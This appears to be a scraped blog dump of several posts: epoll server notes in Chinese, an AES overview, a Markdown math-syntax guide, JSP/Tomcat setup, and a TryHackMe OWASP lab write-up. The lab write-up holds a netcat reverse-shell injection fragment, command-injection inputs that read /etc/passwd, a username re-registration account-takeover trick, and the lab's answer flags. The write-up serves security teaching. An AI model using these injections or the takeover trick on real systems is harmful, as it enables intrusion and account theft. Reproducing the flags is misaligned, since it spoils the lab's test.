ET模式，我们需要创建一个accept的基本事件，而这个事件就是一个channel，那么什么是channel呢，channel的意思就是频道的意思，这是事件处理的最小事件的意思，我们可以把每一次事件处理都看作一个channel，在创建channel的时候，我们还得制定一下这个事件该在哪一个线程中运行，而一个eventloop对应一个线程，所以我们就指定一下evnetloop就好了。然而channel和eventloop是互相依赖的，这里为什么要这么做？比如有时候我们实现了储存化，我们想知道管理该channel的eventloop信息，这时将channel储存eventloop指针就有必要了，当然不是必须的。接着说，将该accept 的channel储存在主线程的eventloop中。\n创建线程池\n创建线程池相当于创建了各个eventloop，这些eventloop相互独立，由eventloop_threadpool来统一管理，包括eventloop的创建，销毁等。而每一个子eventloop用于处理各种客户端请求了。下面再讨论。\n设置监听事件的epoll属性\n在一个建立tcp连接的时候，这时候主线程的eventloop，在lgx::net::epoll::get_all_event_channels中的epoll_wait会等待epoll事件，若epoll事件从一个态转变为另一个态的时候，就会获取到该变化的epoll_fd，然而我们可以通过该epoll_fd查找对应的channel，将该epoll事件储存在channel中的revent变量里，然后储存为一个新的事件，等待线程来调用时什么事件发生了，然而在channel中我们已经定义了几个回调函数，read数据的回调，write数据的回调，还有错误处理，调用后的处理等回调等。 而lgx::net::channel::set_connected_handler就是设置发生事件后的回调处理，一般用来重新设置新的epoll事件，实现epoll的fd再次监听事件。\n当我们设置好accept channel后，在主线程的eventloop添加所需要处理的channel了，主线程启动，用于accept各个客户端的连接。\n若当客户端与服务端发生连接时，这时候，主线程的base_eventloop会中epoll_wait读取发生的events，这里我储存在v_events_变量容器中，依次读取它的epoll_fd获取触发的事件即可，然而我们在设置accept channel的read_handler回调时设置为net::handle_new_connection函数，则建立连接的时候，会回调net::handle_new_connection来进行处理。\n在net::handle_new_connection中，主要是与客户端发生连接了，然而我们采用的是epoll et模式，状态发生变化的时候才有epoll事件发生，accept客户端的时候是一个事件组，不一定只有一个客户端在这个时候发生连接，多个客户端连接的话，也只会触发epoll事件一次，所以我们在accept的时候直到读取接收完客户端为止。每一个客户端连接之后，会判断是否为禁止的ip，若是，则服务端关闭连接。那么我们也还得设置客户端的fd为非阻塞，同样使用epoll et模式来监听该套接字的事件。\n从线程池中拉取一个eventloop来处理，客户端在创建一个http对象的时候，就会被创建一个出一个channel事件，然后将该channel加入获取的eventloop之中来处理，同样在加入之前需要设置一下epoll的监听事件，这里采用eventloop的new_evnet来实现，因为获取到的eventloop不一定是空闲的，所以采取回调来解决初始化问题，设置的初始化epoll事件为EPOLLIN | EPOLLET | EPOLLONESHOT，这样再等获取的eventloop处理完之后就回去执行初始化操作。当该客户端数据来临的时候就epoll_wait就会再次获取epoll事件组，然后根据不同的事件的channel push到待处理容器中，然后就是交给eventloop来执行了。与之前同理，这里就不在多叙述了。\n以上讲的是总体启动过程，然而http是与channel是绑定的，在触发channel的一些回调，相当与调用了http中的某些函数，比如http::handle_read函数，用于接收客户端的数据了，当然，在read的时候不是简单的read即可，我们必须要read到出现EAGAIN错误为止，然后在解析http头部了。当然，我采用储存数据的容器为自己写的vessel，因为采用c++的string发生数据复制问题导致性能下降。读取数据自然就是解析http头部啦，解析头部完整后，再读取http body，读取完整后，会调用http::handle_work()函数，该函数就是用来处理客户端的请求了。然而处理请求之后，需要写给客户端，而lgx::net::http::handle_write()就封装了write函数，若数据没有写完的时候，我们还需要再次设置epoll的event 为EPOLLOUT，以便再次调用lgx::net::http::handle_write()函数继续写给客户端，直到写完或者断开为止。\n后期再继续补补。\n","categories":["dev"],"tags":["server"]},{"title":"Advanced Encryption Standard","url":"/2021/03/24/security/crypto/advanced-encryption-standard/","content":"Advanced Encryption StandardIntroThe Advanced Encryption Standard(AES), also known by its orignal name Rijndael, is a specification for the encryption of electronic data established by the U.S. National Institute of Standards and Technology(NIST) in 2001.\nDefinitive standardsThe Advanced Encryption Standard (AES) is defined in each of:\n\nFIPS PUB 197: Advanced Encryption Standard (AES)\nISO/IEC 18033-3: Block ciphers\n\nDescription of the ciphersAES is based on a design principle known as a substitution–permutation network, and is effcient in both software and hardware. Unlike its predecessor DES, AES does not use a Feistel network. AES is a variant of Rijndael, with a fixed block size of 128 bits, and a key size of 128, 192, or 256 bits. By contrast, Rijndael per se is specified with block and key sizes that may be any multiple of 32 bits, with a AES operations on a 4 × 4 column-major order array of bytes, termed the state. Most AES calculations are done in particular finite field.\nFor instance, 16 bytes, b0, b1, …., b15 are represented as this two-dimensional array:\nThe key size used for an AES cipher specifies the number of transformation rounds that convert the input, called the plaintext, into the final output, called the ciphertext. The number of rounds are as follows:\n\n10 rounds for 128-bit keys.\n12 rounds for 192-bit keys.\n14 rounds for 256-bit keys.\n\nEach round consists of several processing steps, including one that depends on the encryption key itself. A set of reverse rounds are applied to transform ciphertext back into the original plaintext using the same encryption key.\nHigh-level description of the algorithm\nKeyExpansion – round keys are derived from the cipher key using the AES key schedule. AES requires a separate 128-bit round key block for each round plus one more.\n\nInitial round key addition:\n\nAddRoundKey – each byte of the state is combined with a byte of the round key using bitwise xor.\n\n\n9, 11 or 13 rounds\n\nSubBytes – a non-linear substitution step where each byte is replaced with another according to a lookup table.\nShiftRows – a transposition step where the last three rows of the state are shifted cyclically a certain number of steps.\nMixColumns – a linear mixing operation which operates on the columns of the state, combining the four bytes in each column.\nAddRoundKey\n\n\nFinal round (making 10, 12 or 14 rounds in total):\n\nSubBytes\nShiftRows\nAddRoundKey\n\n\n\nThe SubBytes stepUpdating…\nref: https://en.wikipedia.org/wiki/Advanced_Encryption_Standard\n","categories":["security"],"tags":["crypto"]},{"title":"Markdown数学公式语法","url":"/2021/03/24/env/blog/md_math/","content":"Markdown数学公式语法行内与独行\n行内公式：将公式插入到本行内，符号：$公式内容$，如：$xyz$\n独行公式：将公式插入到新的一行内，并且居中，符号：$$公式内容$$，如：$$xyz$$\n\n上标、下标与组合\n上标符号，符号：^，如：$x^4$\n下标符号，符号：_，如：$x_1$\n组合符号，符号：&#123;&#125;，如：${16}{8}O{2+}{2}$\n\n汉字、字体与格式\n汉字形式，符号：\\mbox&#123;&#125;，如：$V_{\\mbox{初始}}$\n字体控制，符号：\\displaystyle，如：$\\displaystyle \\frac{x+y}{y+z}$\n下划线符号，符号：\\underline，如：$\\underline{x+y}$\n标签，符号\\tag&#123;数字&#125;，如：$\\tag{11}$\n上大括号，符号：\\overbrace&#123;算式&#125;，如：$\\overbrace{a+b+c+d}^{2.0}$\n下大括号，符号：\\underbrace&#123;算式&#125;，如：$a+\\underbrace{b+c}_{1.0}+d$\n上位符号，符号：\\stacrel&#123;上位符号&#125;&#123;基位符号&#125;，如：$\\vec{x}\\stackrel{\\mathrm{def}}{&#x3D;}{x_1,\\dots,x_n}$\n\n占位符\n两个quad空格，符号：\\qquad，如：$x \\qquad y$\nquad空格，符号：\\quad，如：$x \\quad y$\n大空格，符号\\，如：$x \\ y$\n中空格，符号\\:，如：$x : y$\n小空格，符号\\,，如：$x , y$\n没有空格，符号&#96;&#96;，如：$xy$\n紧贴，符号\\!，如：$x ! y$\n\n定界符与组合\n括号，符号：（）\\big(\\big) \\Big(\\Big) \\bigg(\\bigg) \\Bigg(\\Bigg)，如：$（）\\big(\\big) \\Big(\\Big) \\bigg(\\bigg) \\Bigg(\\Bigg)$\n中括号，符号：[]，如：$[x+y]$\n大括号，符号：\\&#123; \\&#125;，如：${x+y}$\n自适应括号，符号：\\left \\right，如：$\\left(x\\right)$，$\\left(x{yz}\\right)$\n组合公式，符号：&#123;上位公式 \\choose 下位公式&#125;，如：${n+1 \\choose k}&#x3D;{n \\choose k}+{n \\choose k-1}$\n组合公式，符号：&#123;上位公式 \\atop 下位公式&#125;，如：$\\sum_{k_0,k_1,\\ldots&gt;0 \\atop k_0+k_1+\\cdots&#x3D;n}A_{k_0}A_{k_1}\\cdots$\n\n四则运算\n加法运算，符号：+，如：$x+y&#x3D;z$\n减法运算，符号：-，如：$x-y&#x3D;z$\n加减运算，符号：\\pm，如：$x \\pm y&#x3D;z$\n减甲运算，符号：\\mp，如：$x \\mp y&#x3D;z$\n乘法运算，符号：\\times，如：$x \\times y&#x3D;z$\n点乘运算，符号：\\cdot，如：$x \\cdot y&#x3D;z$\n星乘运算，符号：\\ast，如：$x \\ast y&#x3D;z$\n除法运算，符号：\\div，如：$x \\div y&#x3D;z$\n斜法运算，符号：/，如：$x&#x2F;y&#x3D;z$\n分式表示，符号：\\frac&#123;分子&#125;&#123;分母&#125;，如：$\\frac{x+y}{y+z}$\n分式表示，符号：&#123;分子&#125; \\voer &#123;分母&#125;，如：${x+y} \\over {y+z}$\n绝对值表示，符号：||，如：$|x+y|$\n\n高级运算\n平均数运算，符号：\\overline&#123;算式&#125;，如：$\\overline{xyz}$\n开二次方运算，符号：\\sqrt，如：$\\sqrt x$\n开方运算，符号：\\sqrt[开方数]&#123;被开方数&#125;，如：$\\sqrt[3]{x+y}$\n对数运算，符号：\\log，如：$\\log(x)$\n极限运算，符号：\\lim，如：$\\lim^{x \\to \\infty}_{y \\to 0}{\\frac{x}{y}}$\n极限运算，符号：\\displaystyle \\lim，如：$\\displaystyle \\lim^{x \\to \\infty}_{y \\to 0}{\\frac{x}{y}}$\n求和运算，符号：\\sum，如：$\\sum^{x \\to \\infty}_{y \\to 0}{\\frac{x}{y}}$\n求和运算，符号：\\displaystyle \\sum，如：$\\displaystyle \\sum^{x \\to \\infty}_{y \\to 0}{\\frac{x}{y}}$\n积分运算，符号：\\int，如：$\\int^{\\infty}_{0}{xdx}$\n积分运算，符号：\\displaystyle \\int，如：$\\displaystyle \\int^{\\infty}_{0}{xdx}$\n微分运算，符号：\\partial，如：$\\frac{\\partial x}{\\partial y}$\n矩阵表示，符号：\\begin&#123;matrix&#125; \\end&#123;matrix&#125;，如：$\\left[ \\begin{matrix} 1 &amp;2 &amp;\\cdots &amp;4\\5 &amp;6 &amp;\\cdots &amp;8\\vdots &amp;\\vdots &amp;\\ddots &amp;\\vdots\\13 &amp;14 &amp;\\cdots &amp;16\\end{matrix} \\right]$\n\n逻辑运算\n等于运算，符号：=，如：$x+y&#x3D;z$\n大于运算，符号：&gt;，如：$x+y&gt;z$\n小于运算，符号：&lt;，如：$x+y&lt;z$\n大于等于运算，符号：\\geq，如：$x+y \\geq z$\n小于等于运算，符号：\\leq，如：$x+y \\leq z$\n不等于运算，符号：\\neq，如：$x+y \\neq z$\n不大于等于运算，符号：\\ngeq，如：$x+y \\ngeq z$\n不大于等于运算，符号：\\not\\geq，如：$x+y \\not\\geq z$\n不小于等于运算，符号：\\nleq，如：$x+y \\nleq z$\n不小于等于运算，符号：\\not\\leq，如：$x+y \\not\\leq z$\n约等于运算，符号：\\approx，如：$x+y \\approx z$\n恒定等于运算，符号：\\equiv，如：$x+y \\equiv z$\n\n集合运算\n属于运算，符号：\\in，如：$x \\in y$\n不属于运算，符号：\\notin，如：$x \\notin y$\n不属于运算，符号：\\not\\in，如：$x \\not\\in y$\n子集运算，符号：\\subset，如：$x \\subset y$\n子集运算，符号：\\supset，如：$x \\supset y$\n真子集运算，符号：\\subseteq，如：$x \\subseteq y$\n非真子集运算，符号：\\subsetneq，如：$x \\subsetneq y$\n真子集运算，符号：\\supseteq，如：$x \\supseteq y$\n非真子集运算，符号：\\supsetneq，如：$x \\supsetneq y$\n非子集运算，符号：\\not\\subset，如：$x \\not\\subset y$\n非子集运算，符号：\\not\\supset，如：$x \\not\\supset y$\n并集运算，符号：\\cup，如：$x \\cup y$\n交集运算，符号：\\cap，如：$x \\cap y$\n差集运算，符号：\\setminus，如：$x \\setminus y$\n同或运算，符号：\\bigodot，如：$x \\bigodot y$\n同与运算，符号：\\bigotimes，如：$x \\bigotimes y$\n实数集合，符号：\\mathbb&#123;R&#125;，如：\\mathbb&#123;R&#125;\n自然数集合，符号：\\mathbb&#123;Z&#125;，如：\\mathbb&#123;Z&#125;\n空集，符号：\\emptyset，如：$\\emptyset$\n\n数学符号\n无穷，符号：\\infty，如：$\\infty$\n虚数，符号：\\imath，如：$\\imath$\n虚数，符号：\\jmath，如：$\\jmath$\n数学符号，符号\\hat&#123;a&#125;，如：$\\hat{a}$\n数学符号，符号\\check&#123;a&#125;，如：$\\check{a}$\n数学符号，符号\\breve&#123;a&#125;，如：$\\breve{a}$\n数学符号，符号\\tilde&#123;a&#125;，如：$\\tilde{a}$\n数学符号，符号\\bar&#123;a&#125;，如：$\\bar{a}$\n矢量符号，符号\\vec&#123;a&#125;，如：$\\vec{a}$\n数学符号，符号\\acute&#123;a&#125;，如：$\\acute{a}$\n数学符号，符号\\grave&#123;a&#125;，如：$\\grave{a}$\n数学符号，符号\\mathring&#123;a&#125;，如：$\\mathring{a}$\n一阶导数符号，符号\\dot&#123;a&#125;，如：$\\dot{a}$\n二阶导数符号，符号\\ddot&#123;a&#125;，如：$\\ddot{a}$\n上箭头，符号：\\uparrow，如：$\\uparrow$\n上箭头，符号：\\Uparrow，如：$\\Uparrow$\n下箭头，符号：\\downarrow，如：$\\downarrow$\n下箭头，符号：\\Downarrow，如：$\\Downarrow$\n左箭头，符号：\\leftarrow，如：$\\leftarrow$\n左箭头，符号：\\Leftarrow，如：$\\Leftarrow$\n右箭头，符号：\\rightarrow，如：$\\rightarrow$\n右箭头，符号：\\Rightarrow，如：$\\Rightarrow$\n底端对齐的省略号，符号：\\ldots，如：$1,2,\\ldots,n$\n中线对齐的省略号，符号：\\cdots，如：$x_1^2 + x_2^2 + \\cdots + x_n^2$\n竖直对齐的省略号，符号：\\vdots，如：$\\vdots$\n斜对齐的省略号，符号：\\ddots，如：$\\ddots$\n\n希腊字母\n\n\n字母\n实现\n字母\n实现\n\n\n\nA\nA\nα\n\\alhpa\n\n\nB\nB\nβ\n\\beta\n\n\nΓ\n\\Gamma\nγ\n\\gamma\n\n\nΔ\n\\Delta\nδ\n\\delta\n\n\nE\nE\nϵ\n\\epsilon\n\n\nZ\nZ\nζ\n\\zeta\n\n\nH\nH\nη\n\\eta\n\n\nΘ\n\\Theta\nθ\n\\theta\n\n\nI\nI\nι\n\\iota\n\n\nK\nK\nκ\n\\kappa\n\n\nΛ\n\\Lambda\nλ\n\\lambda\n\n\nM\nM\nμ\n\\mu\n\n\nN\nN\nν\n\\nu\n\n\nΞ\n\\Xi\nξ\n\\xi\n\n\nO\nO\nο\n\\omicron\n\n\nΠ\n\\Pi\nπ\n\\pi\n\n\nP\nP\nρ\n\\rho\n\n\nΣ\n\\Sigma\nσ\n\\sigma\n\n\nT\nT\nτ\n\\tau\n\n\nΥ\n\\Upsilon\nυ\n\\upsilon\n\n\nΦ\n\\Phi\nϕ\n\\phi\n\n\nX\nX\nχ\n\\chi\n\n\nΨ\n\\Psi\nψ\n\\psi\n\n\nΩ\n\\v\nω\n\\omega\n\n\n写矩阵不带括号的矩阵代码之后的tag实现了后标\n$$  \\begin&#123;matrix&#125;   1 &amp; 2 &amp; 3 \\\\   4 &amp; 5 &amp; 6 \\\\   7 &amp; 8 &amp; 9  \\end&#123;matrix&#125; \\tag&#123;1&#125;$$\n\n效果\n$$\\begin{matrix}   1 &amp; 2 &amp; 3 \\   4 &amp; 5 &amp; 6 \\   7 &amp; 8 &amp; 9  \\end{matrix} \\tag{1}$$\n带括号{}的矩阵\n$$ \\left\\&#123; \\begin&#123;matrix&#125;   1 &amp; 2 &amp; 3 \\\\   4 &amp; 5 &amp; 6 \\\\   7 &amp; 8 &amp; 9  \\end&#123;matrix&#125;  \\right\\&#125; \\tag&#123;2&#125;$$\n\n效果$$\\left{ \\begin{matrix}   1 &amp; 2 &amp; 3 \\   4 &amp; 5 &amp; 6 \\   7 &amp; 8 &amp; 9  \\end{matrix}  \\right} \\tag{2}$$\n带括号[]的矩阵\n\\left[ \\begin&#123;matrix&#125;   1 &amp; 2 &amp; 3 \\\\   4 &amp; 5 &amp; 6 \\\\   7 &amp; 8 &amp; 9  \\end&#123;matrix&#125;  \\right] \\tag&#123;3&#125;\n\n效果$$\\left[ \\begin{matrix}   1 &amp; 2 &amp; 3 \\   4 &amp; 5 &amp; 6 \\   7 &amp; 8 &amp; 9  \\end{matrix}  \\right] \\tag{3}$$\n不使用left和right关键词\n\\begin&#123;bmatrix&#125;   1 &amp; 2 &amp; 3 \\\\   4 &amp; 5 &amp; 6 \\\\   7 &amp; 8 &amp; 9  \\end&#123;bmatrix&#125; \\tag&#123;4&#125;\n\n效果$$\\begin{bmatrix}   1 &amp; 2 &amp; 3 \\   4 &amp; 5 &amp; 6 \\   7 &amp; 8 &amp; 9  \\end{bmatrix} \\tag{4}$$\n对于大括号：\n\\begin&#123;Bmatrix&#125;   1 &amp; 2 &amp; 3 \\\\   4 &amp; 5 &amp; 6 \\\\   7 &amp; 8 &amp; 9  \\end&#123;Bmatrix&#125; \\tag&#123;5&#125;\n\n效果$$\\begin{Bmatrix}   1 &amp; 2 &amp; 3 \\   4 &amp; 5 &amp; 6 \\   7 &amp; 8 &amp; 9  \\end{Bmatrix} \\tag{5}$$\n包含省略的矩阵\n\\left[\\begin&#123;matrix&#125; 1      &amp; 2      &amp; \\cdots &amp; 4      \\\\ 7      &amp; 6      &amp; \\cdots &amp; 5      \\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 8      &amp; 9      &amp; \\cdots &amp; 0      \\\\\\end&#123;matrix&#125;\\right]\n\n效果$$\\left[\\begin{matrix} 1      &amp; 2      &amp; \\cdots &amp; 4      \\ 7      &amp; 6      &amp; \\cdots &amp; 5      \\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\ 8      &amp; 9      &amp; \\cdots &amp; 0      \\\\end{matrix}\\right]$$带参数的矩阵在矩阵中画出一条分割线，以强调最右侧一列的特殊性。\n\\left[    \\begin&#123;array&#125;&#123;cc|c&#125;      1 &amp; 2 &amp; 3 \\\\      4 &amp; 5 &amp; 6    \\end&#123;array&#125;\\right] \\tag&#123;7&#125;\n\n效果$$\\left[    \\begin{array}{cc|c}      1 &amp; 2 &amp; 3 \\      4 &amp; 5 &amp; 6    \\end{array}\\right] \\tag{7}$$\nref：https://blog.csdn.net/qq_38228254/article/details/79469727\n","categories":["env"],"tags":["markdown"]},{"title":"JSP环境搭建","url":"/2021/03/24/dev/language/jsp/jsp_env/","content":"JSP环境搭建JSP与Sewlet\nJSP是由Sun公司倡导、许多公司参与一起建立的一种动态网页技术标准。JSP技术是用Java语言作为脚本语言。JSP网页为整个服务器端的Java库单元提供了一个接口来服务于HTTP的应用程序。Apache做为最流行的web服务器功能强大,高效,但并不支持jsp及servlet,所以通常的做法是把它们整合起来,让Apache处理静态页面,而把动态页面的请求交给 tomcat处理,发挥各自的优势。\n由此可以看出，JSP的主要作用是对服务器端的Java程序提供接口， 以便进行HTTP的交互。而要实现这种接口就必须要有一个处理JSP脚本的容器，更进一步，知道所有JSP脚本在运行时刻，都会被编译成Servlet，所以要处理JSP的容器就是–Servlet容器。现在世界上比较常用的Servlet容器主要有两种，一种是Apache基金会的Tomcat，另外一种是Jetty。相比较而言两者在Servlet处理上不相上下， Tomcat与Apache的HTTP服务器相结合可以大大提高网站的访问承受能力，而Jetty就比较单纯的是一个Servlet容器而已。\ntomcat这里一下载tomcat 10为例下载，下载之后进入bin目录，运行startup.sh，默认端口号为8080端口，采用浏览器访问localhost:8080能进入页面，说明运行正常。\n注意目录名不能有中文和空格。目录介绍如下：\n\nbin：二进制执行文件。里面最常用的文件是startup.bat，如果是 Linux 或 Mac 系统启动文件为 startup.sh。\n\nconf:配置目录。里面最核心的文件是server.xml。可以在里面改端口号等。默认端口号是8080，也就是说，此端口号不能被其他应用程序占用。\n\nlib：库文件。tomcat运行时需要的jar包所在的目录\n\nlogs：日志\n\ntemp：临时产生的文件，即缓存\n\nwebapps：web的应用程序。web应用放置到此目录下浏览器可以直接访问\n\nwork：编译以后的class文件。\n\n\nweb: http://tomcat.apache.org/\n测试:\n首先在webapps\\ROOT中建立一个jsp文件:\ntest.jsp，代码如下:\n&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; %&gt;&lt;%out.print(&quot;Hello JSP&quot;);%&gt; \n\n\n\nref: https://www.runoob.com/jsp/eclipse-jsp.html\nref: https://www.cnblogs.com/chenguang/p/3742317.html\n","categories":["language"],"tags":["jsp"]},{"title":"TryHackMe OWASP","url":"/2021/03/24/security/tryhackme/tryhackme-owasp/","content":"TryHackMe OWASPIntroductionThis room breaks each OWASP topic down and includes details on what the vulnerability is, how it occurs and how you can exploit it. You will put the theory into practise by completing supporting challenges.\n\nInjection\nBroken Authentication\nSensitive Data Exposure\nXML External Entity\nBroken Access Control\nSecurity Misconfiguration\nCross-site Scripting\nInsecure Deserialization\nComponents with Known Vulnerabilities\nInsufficent Logging &amp; Monitoring\n\nThe room has been designed for beginners and assume no previous knowledge of security.\n[Severity 1] InjectionInjection flaws are very common in applications today. These flaws occur because user controlled input is interpreted as actual commands or parameters by the application. Injection attacks depend on what technologies are being used and how exactly the input is interpreted by these technologies. Some common examples include:\n\nSQL Injection: This occurs when user controlled input is passed to SQL queries. As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries. \nCommand Injection: This occurs when user input is passed to system commands. As a result, an attacker is able to execute arbitrary system commands on application servers.\n\nIf an attacker is able to successfully pass input that is interpreted correctly, they would be able to do the following:\n\nAccess, Modify and Delete information in a database when this input is passed into database queries. This would mean that an attacker can steal sensitive information such as personal details and credentials.\nExecute Arbitrary system commands on a server that would allow an attacker to gain access to users’ systems. This would enable them to steal sensitive data and carry out more attacks against infrastructure linked to the server on which the command is executed.\n\nThe main defence for preventing injection attacks is ensuring that user controlled input is not interpreted as queries or commands. There are different ways of doing this:\n\nUsing an allow list: when input is sent to the server, this input is compared to a list of safe input or characters. If the input is marked as safe, then it is processed. Otherwise, it is rejected and the application throws an error.\nStripping input: If the input contains dangerous characters, these characters are removed before they are processed.\n\nDangerous characters or input is classified as any input that can change how the underlying data is processed. Instead of manually constructing allow lists or even just stripping input, there are various libraries that perform these actions for you.\n[Severity 1] OS Command InjectionCommand Injection occurs when server-side code (like PHP) in a web application makes a system call on the hosting machine. It is a web vulnerability that allows an attacker to take advantage of that made system call to execute operating system commands on the server. Sometimes this won’t always end in something malicious, like a whoami or just reading of files. That isn’t too bad. But the thing about command injection is it opens up many options for the attacker. The worst thing they could do would be to spawn a reverse shell to become the user that the web server is running as. A simple ;nc -e /bin/bash is all that’s needed and they own your server; some variants of netcat don’t support the -e option. You can use a list of [these](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources&#x2F;Reverse Shell Cheatsheet.md) reverse shells as an alternative. \nOnce the attacker has a foothold on the web server, they can start the usual enumeration of your systems and start looking for ways to pivot around. Now that we know what command injection is, we’ll start going into the different types and how to test for them.\n[Severity 1] Command Injection PracticalWhat is Active Command Injection?\nBlind command injection occurs when the system command made to the server does not return the response to the user in the HTML document. Active command injection will return the response to the user. It can be made visible through several HTML elements. \nLet’s consider a scenario: EvilCorp has started development on a web based shell but has accidentally left it exposed to the Internet. It’s nowhere near finished but contains the same command injection vulnerability as before! But this time, the response from the system call can be seen on the page! They’ll never learn!\nJust like before, let’s look at the sample code from evilshell.php and go over what it’s doing and why it makes it active command injection. See if you can figure it out. I’ll go over it below just as before.\nEvilShell (evilshell.php) Code Example\n\nIn pseudocode, the above snippet is doing the following:\n\nChecking if the parameter “commandString” is set\n\nIf it is, then the variable $command_string gets what was passed into the input field\n\nThe program then goes into a try block to execute the function passthru($command_string). You can read the docs on passthru() on PHP’s website, but in general, it is executing what gets entered into the input then passing the output directly back to the browser.\n\nIf the try does not succeed, output the error to page. Generally this won’t output anything because you can’t output stderr but PHP doesn’t let you have a try without a catch.\n\n\nWays to Detect Active Command Injection\nWe know that active command injection occurs when you can see the response from the system call. In the above code, the function passthru() is actually what’s doing all of the work here. It’s passing the response directly to the document so you can see the fruits of your labor right there. Since we know that, we can go over some useful commands to try to enumerate the machine a bit further. The function call here to passthru() may not always be what’s happening behind the scenes, but I felt it was the easiest and least complicated way to demonstrate the vulnerability. \nCommands to try\nLinux\n\nwhoami\nid\nifconfig&#x2F;ip addr\nuname -a\nps -ef\n\n\nWindows\n\nwhoami\nver\nipconfig\ntasklist\nnetstat -an\n\nchall 1What strange text file is in the website root directory?\ninput\nls\n\noutput\ncss drpepper.txt evilshell.php index.php js\n\nso anwser is drpepper.txt\nchall2How many non-root&#x2F;non-service&#x2F;non-daemon users are there?\nchall3What user is this app running as?\ninput\nwhoami\n\noutput\nwww-data\n\nanwser: www-data\nchall4What is the user’s shell set as?\ninput\ncat /etc/passwd | grep www-data\n\noutput:\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n\nanwser: &#x2F;usr&#x2F;sbin&#x2F;nologin\nchall5What version of Ubuntu is running?\ninput\nlsb_release -a\n\noutput\nDistributor ID: Ubuntu Description: Ubuntu 18.04.4 LTS Release: 18.04 Codename: bionic\n\nanwser: 18.04.4\nchall6Print out the MOTD. What favorite beverage is shown?\ninput\ncat drpepper.txt\n\noutput\nI love Dr Pepper\n\nanwser: Dr Pepper\n[Severity 2] Broken AuthenticationAuthentication and session management constitute core components of modern web applications. Authentication allows users to gain access to web applications by verifying their identities. The most common form of authentication is using a username and password mechanism. A user would enter these credentials, the server would verify them. If they are correct, the server would then provide the users’ browser with a session cookie. A session cookie is needed because web servers use HTTP(S) to communicate which is stateless. Attaching session cookies means that the server will know who is sending what data. The server can then keep track of users’ actions. \nIf an attacker is able to find flaws in an authentication mechanism, they would then successfully gain access to other users’ accounts. This would allow the attacker to access sensitive data (depending on the purpose of the application). Some common flaws in authentication mechanisms include:\n\nBrute force attacks: If a web application uses usernames and passwords, an attacker is able to launch brute force attacks that allow them to guess the username and passwords using multiple authentication attempts. \nUse of weak credentials: web applications should set strong password policies. If applications allow users to set passwords such as ‘password1’ or common passwords, then an attacker is able to easily guess them and access user accounts. They can do this without brute forcing and without multiple attempts.\nWeak Session Cookies: Session cookies are how the server keeps track of users. If session cookies contain predictable values, an attacker can set their own session cookies and access users’ accounts.\n\nThere can be various mitigation for broken authentication mechanisms depending on the exact flaw:\n\nTo avoid password guessing attacks, ensure the application enforces a strong password policy. \nTo avoid brute force attacks, ensure that the application enforces an automatic lockout after a certain number of attempts. This would prevent an attacker from launching more brute force attacks.\nImplement Multi Factor Authentication - If a user has multiple methods of authentication, for example, using username and passwords and receiving a code on their mobile device, then it would be difficult for an attacker to get access to both credentials to get access to their account.\n\n[Severity 2] Broken Authentication PracticalFor this example, we’ll be looking at a logic flaw within the authentication mechanism.\nA lot of times what happens is that developers forgets to sanitize the input(username &amp; password) given by the user in the code of their application, which can make them vulnerable to attacks like SQL injection. However, we are going to focus on a vulnerability that happens because of a developer’s mistake but is very easy to exploit i.e re-registration of an existing user.\nLet’s understand this with the help of an example, say there is an existing user with the name admin and now we want to get access to their account so what we can do is try to re-register that username but with slight modification. We are going to enter “ admin”(notice the space in the starting). Now when you enter that in the username field and enter other required information like email id or password and submit that data. It will actually register a new user but that user will have the same right as normal admin. That new user will also be able to see all the content presented under the user admin.\nTo see this in action go to http://MACHINE_IP:8888 and try to register a user name darren, you’ll see that user already exists so then try to register a user “ darren**”** and you’ll see that you are now logged in and will be able to see the content present only in Darren’s account which in our case is the flag that you need to retrieve.\nchall1We can add {space} in the username. Make an account then it will give us the existing user’s account.so I followed the same methodology &amp; made an account with darren username.\nregister: [space] darren, then login to get flag\nanwser: fe86079416a21a3c99937fea8874b667  \nchall2Now try to do the same trick and see if you can login as arthur. What is the flag that you found in arthur’s account?\nanwser: d9ac0f7db4fda460ac3edeb75d75e16e\n[Severity 3] Sensitive Data Exposure (Introduction)When a webapp accidentally divulges sensitive data, we refer to it as “Sensitive Data Exposure”. This is often data directly linked to customers (e.g. names, dates-of-birth, financial information, etc), but could also be more technical information, such as usernames and passwords. At more complex levels this often involves techniques such as a “Man in The Middle Attack”, whereby the attacker would force user connections through a device which they control, then take advantage of weak encryption on any transmitted data to gain access to the intercepted information (if the data is even encrypted in the first place…). Of course, many examples are much simpler, and vulnerabilities can be found in web apps which can be exploited without any advanced networking knowledge. Indeed, in some cases, the sensitive data can be found directly on the webserver itself…\nThe web application in this box contains one such vulnerability. Deploy the machine, then read through the supporting material in the following tasks as the box boots up.\n[Severity 3] Sensitive Data Exposure (Supporting Material 1)The most common way to store a large amount of data in a format that is easily accessible from many locations at once is in a database. This is obviously perfect for something like a web application, as there may be many users interacting with the website at any one time. Database engines usually follow the Structured Query Language (SQL) syntax; however, alternative formats (such as NoSQL) are rising in popularity.\nIn a production environment it is common to see databases set up on dedicated servers, running a database service such as MySQL or MariaDB; however, databases can also be stored as files. These databases are referred to as “flat-file” databases, as they are stored as a single file on the computer. This is much easier than setting up a full database server, and so could potentially be seen in smaller web applications. Accessing a database server is outwith the scope of today’s task, so let’s focus instead on flat-file databases.\nAs mentioned previously, flat-file databases are stored as a file on the disk of a computer. Usually this would not be a problem for a webapp, but what happens if the database is stored underneath the root directory of the website (i.e. one of the files that a user connecting to the website is able to access)? Well, we can download it and query it on our own machine, with full access to everything in the database. Sensitive Data Exposure indeed!\nThat is a big hint for the challenge, so let’s briefly cover some of the syntax we would use to query a flat-file database.\nThe most common (and simplest) format of flat-file database is an sqlite database. These can be interacted with in most programming languages, and have a dedicated client for querying them on the command line. This client is called “sqlite3“, and is installed by default on Kali.\nLet’s suppose we have successfully managed to download a database:\n\nWe can see that there is an SQlite database in the current folder.\nTo access it we use: sqlite3 &lt;database-name&gt;:\n\nFrom here we can see the tables in the database by using the .tables command:\n\nAt this point we can dump all of the data from the table, but we won’t necessarily know what each column means unless we look at the table information. First let’s use PRAGMA table_info(customers); to see the table information, then we’ll use SELECT * FROM customers; to dump the information from the table:\n\nWe can see from the table information that there are four columns: custID, custName, creditCard and password. You may notice that this 